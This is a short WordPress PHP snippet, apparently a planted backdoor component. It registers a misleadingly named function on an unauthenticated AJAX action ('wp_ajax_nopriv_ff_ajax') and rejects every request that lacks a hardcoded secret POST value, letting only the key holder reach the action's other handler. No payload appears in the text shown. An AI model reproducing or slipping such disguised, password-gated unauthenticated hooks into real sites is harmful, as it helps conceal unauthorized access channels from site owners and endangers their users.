<?php

function replace_heading_orders() {
	if (!isset($_POST["uzzooifu"]) || $_POST["uzzooifu"] !== "nWpT5L6TmNEoH") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'replace_heading_orders', 5, 1);
